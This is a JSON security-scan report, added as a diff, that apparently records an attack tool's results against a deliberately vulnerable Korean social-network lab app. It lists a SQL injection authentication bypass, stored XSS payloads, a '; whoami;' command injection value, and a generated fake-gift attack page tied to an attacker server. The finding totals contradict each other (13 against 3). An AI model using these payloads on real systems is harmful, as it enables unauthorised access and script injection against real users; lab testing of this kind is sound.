@@ -1,0 +1,295 @@
+{
+  "metadata": {
+    "target": "http://15.164.95.252/login.php",
+    "attacker_server": "http://13.158.67.78:5000",
+    "start_time": "2025-11-06 17:48:23",
+    "end_time": "2025-11-06 17:48:50",
+    "duration_seconds": 26,
+    "attacker_user_id": "1",
+    "tool_version": "1.0"
+  },
+  "summary": {
+    "total_vulnerabilities": 13,
+    "critical_count": 2,
+    "high_count": 11,
+    "vulnerability_breakdown": {
+      "sql_injection": 2,
+      "file_upload": 1,
+      "lfi": 0,
+      "xss": 10,
+      "csrf": 0
+    }
+  },
+  "vulnerabilities": {
+    "sql_injection": [
+      {
+        "url": "http://15.164.95.252/login.php/login.php",
+        "username": "admin",
+        "password": "' or '1'='1' --",
+        "description": "Basic single quote OR bypass (Error-based confirmed)",
+        "errors_found": [
+          "mysql",
+          "sql syntax",
+          "error in your sql"
+        ],
+        "impact": "HIGH - Database information disclosure via errors",
+        "cvss_score": 8.0
+      },
+      {
+        "url": "http://15.164.95.252/login.php/login.php",
+        "username": "admin",
+        "password": "' or 1=1#",
+        "description": "Hash comment bypass",
+        "response_time": 0.012110710144042969,
+        "bypass_method": "Advanced SQL Injection",
+        "redirect_location": "index.php",
+        "final_url": "http://15.164.95.252/index.php",
+        "impact": "CRITICAL - Authentication bypass via advanced SQLi",
+        "cvss_score": 9.8
+      }
+    ],
+    "xss": [
+      {
+        "type": "Stored XSS - Pattern Hijacking Success",
+        "url": "http://15.164.95.252/new_post.php",
+        "payload": "<script>alert(2)</script>",
+        "payload_type": "exact_copy_number2",
+        "level": 1,
+        "success_indicators": [
+          "english_words",
+          "alert_function"
+        ],
+        "verification_method": "Pattern hijacking + count analysis",
+        "alert_message": "대머리/빡빡이 (or alternatives)",
+        "hijack_success": true,
+        "korean_success": false,
+        "impact": "HIGH - XSS pattern hijacking successful",
+        "cvss_score": 8.8
+      },
+      {
+        "type": "Stored XSS - Pattern Hijacking Success",
+        "url": "http://15.164.95.252/new_post.php",
+        "payload": "<script>alert(3)</script>",
+        "payload_type": "exact_copy_number3",
+        "level": 2,
+        "success_indicators": [
+          "english_words",
+          "alert_function"
+        ],
+        "verification_method": "Pattern hijacking + count analysis",
+        "alert_message": "대머리/빡빡이 (or alternatives)",
+        "hijack_success": true,
+        "korean_success": false,
+        "impact": "HIGH - XSS pattern hijacking successful",
+        "cvss_score": 8.8
+      },
+      {
+        "type": "Stored XSS - Pattern Hijacking Success",
+        "url": "http://15.164.95.252/new_post.php",
+        "payload": "<script>alert(\"bald\")</script>",
+        "payload_type": "english_bald",
+        "level": 3,
+        "success_indicators": [
+          "english_words",
+          "alert_function"
+        ],
+        "verification_method": "Pattern hijacking + count analysis",
+        "alert_message": "대머리/빡빡이 (or alternatives)",
+        "hijack_success": true,
+        "korean_success": false,
+        "impact": "HIGH - XSS pattern hijacking successful",
+        "cvss_score": 8.8
+      },
+      {
+        "type": "Stored XSS - Pattern Hijacking Success",
+        "url": "http://15.164.95.252/new_post.php",
+        "payload": "<script>alert(\"head\")</script>",
+        "payload_type": "english_head",
+        "level": 4,
+        "success_indicators": [
+          "english_words",
+          "alert_function"
+        ],
+        "verification_method": "Pattern hijacking + count analysis",
+        "alert_message": "대머리/빡빡이 (or alternatives)",
+        "hijack_success": true,
+        "korean_success": false,
+        "impact": "HIGH - XSS pattern hijacking successful",
+        "cvss_score": 8.8
+      },
+      {
+        "type": "Stored XSS - Pattern Hijacking Success",
+        "url": "http://15.164.95.252/new_post.php",
+        "payload": "<script>alert(\"대머리\")</script>",
+        "payload_type": "korean_short1",
+        "level": 5,
+        "success_indicators": [
+          "english_words",
+          "alert_function"
+        ],
+        "verification_method": "Pattern hijacking + count analysis",
+        "alert_message": "대머리/빡빡이 (or alternatives)",
+        "hijack_success": true,
+        "korean_success": false,
+        "impact": "HIGH - XSS pattern hijacking successful",
+        "cvss_score": 8.8
+      },
+      {
+        "type": "Stored XSS - Pattern Hijacking Success",
+        "url": "http://15.164.95.252/new_post.php",
+        "payload": "<script>alert(\"빡빡이\")</script>",
+        "payload_type": "korean_short2",
+        "level": 6,
+        "success_indicators": [
+          "english_words",
+          "alert_function"
+        ],
+        "verification_method": "Pattern hijacking + count analysis",
+        "alert_message": "대머리/빡빡이 (or alternatives)",
+        "hijack_success": true,
+        "korean_success": false,
+        "impact": "HIGH - XSS pattern hijacking successful",
+        "cvss_score": 8.8
+      },
+      {
+        "type": "Stored XSS - Pattern Hijacking Success",
+        "url": "http://15.164.95.252/new_post.php",
+        "payload": "<img src=x onerror=alert(2)>",
+        "payload_type": "img_copy_number2",
+        "level": 7,
+        "success_indicators": [
+          "exact_payload",
+          "alert_2_or_3",
+          "english_words",
+          "alert_function"
+        ],
+        "verification_method": "Pattern hijacking + count analysis",
+        "alert_message": "대머리/빡빡이 (or alternatives)",
+        "hijack_success": true,
+        "korean_success": false,
+        "impact": "HIGH - XSS pattern hijacking successful",
+        "cvss_score": 8.8
+      },
+      {
+        "type": "Stored XSS - Pattern Hijacking Success",
+        "url": "http://15.164.95.252/new_post.php",
+        "payload": "<img src=x onerror=alert(\"bald\")>",
+        "payload_type": "img_english_bald",
+        "level": 8,
+        "success_indicators": [
+          "exact_payload",
+          "alert_2_or_3",
+          "english_words",
+          "alert_function"
+        ],
+        "verification_method": "Pattern hijacking + count analysis",
+        "alert_message": "대머리/빡빡이 (or alternatives)",
+        "hijack_success": true,
+        "korean_success": false,
+        "impact": "HIGH - XSS pattern hijacking successful",
+        "cvss_score": 8.8
+      },
+      {
+        "type": "Stored XSS - Pattern Hijacking Success",
+        "url": "http://15.164.95.252/new_post.php",
+        "payload": "<svg onload=alert(2)>",
+        "payload_type": "svg_copy_number2",
+        "level": 9,
+        "success_indicators": [
+          "exact_payload",
+          "alert_2_or_3",
+          "english_words",
+          "alert_function"
+        ],
+        "verification_method": "Pattern hijacking + count analysis",
+        "alert_message": "대머리/빡빡이 (or alternatives)",
+        "hijack_success": true,
+        "korean_success": false,
+        "impact": "HIGH - XSS pattern hijacking successful",
+        "cvss_score": 8.8
+      },
+      {
+        "type": "Stored XSS - Pattern Hijacking Success",
+        "url": "http://15.164.95.252/new_post.php",
+        "payload": "<svg onload=alert(\"대머리\")>",
+        "payload_type": "svg_korean_short",
+        "level": 10,
+        "success_indicators": [
+          "exact_payload",
+          "alert_2_or_3",
+          "english_words",
+          "korean_short",
+          "target_text",
+          "alert_function"
+        ],
+        "verification_method": "Pattern hijacking + count analysis",
+        "alert_message": "대머리/빡빡이 (or alternatives)",
+        "hijack_success": true,
+        "korean_success": true,
+        "impact": "HIGH - XSS pattern hijacking successful",
+        "cvss_score": 8.8
+      }
+    ],
+    "csrf": [],
+    "lfi": [],
+    "file_upload": [
+      {
+        "type": "Command Injection via POST",
+        "url": "http://15.164.95.252/new_post.php",
+        "parameter": "content",
+        "payload": "; whoami;",
+        "indicators_found": [
+          "TEST_",
+          "Ubuntu"
+        ],
+        "response_preview": "<!DOCTYPE html>\n<html lang=\"ko\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>홈 - Vulnerable SNS</title>\n    <link rel=\"stylesheet\" href=\"https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css\">\n    <style>\n        /* CSS는 원본 그대로 사용 */\n        * { margin: 0; padding: 0; box-sizing: border-box; }\n        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell,",
+        "impact": "CRITICAL - Remote Command Execution via POST injection",
+        "cvss_score": 9.8
+      }
+    ]
+  },
+  "attack_timeline": [
+    {
+      "timestamp": "2025-11-06 17:48:23",
+      "type": "SCAN_START",
+      "description": "Security assessment started on http://15.164.95.252/login.php",
+      "severity": "INFO",
+      "details": {}
+    },
+    {
+      "timestamp": "2025-11-06 17:48:25",
+      "type": "ADVANCED_SQL_INJECTION",
+      "description": "Successfully bypassed authentication using: Hash comment bypass",
+      "severity": "CRITICAL",
+      "details": {
+        "payload": "username=admin, password=' or 1=1#",
+        "method": "Hash comment bypass",
+        "bypass_technique": "Advanced SQL Injection",
+        "response_time": 0.012110710144042969,
+        "points": 0
+      }
+    },
+    {
+      "timestamp": "2025-11-06 17:48:40",
+      "type": "SETUP",
+      "description": "Generated fake-gift.html attack page",
+      "severity": "INFO",
+      "details": {
+        "filename": "fake-gift.html",
+        "attacker_id": "1",
+        "attack_server": "http://13.158.67.78:5000"
+      }
+    },
+    {
+      "timestamp": "2025-11-06 17:48:40",
+      "type": "SCAN_COMPLETE",
+      "description": "Security assessment completed. 3 vulnerabilities found",
+      "severity": "INFO",
+      "details": {}
+    }
+  ],
+  "artifacts": {
+    "uploaded_webshell": null,
+    "fake_gift_page": "fake-gift.html"
+  }
+}
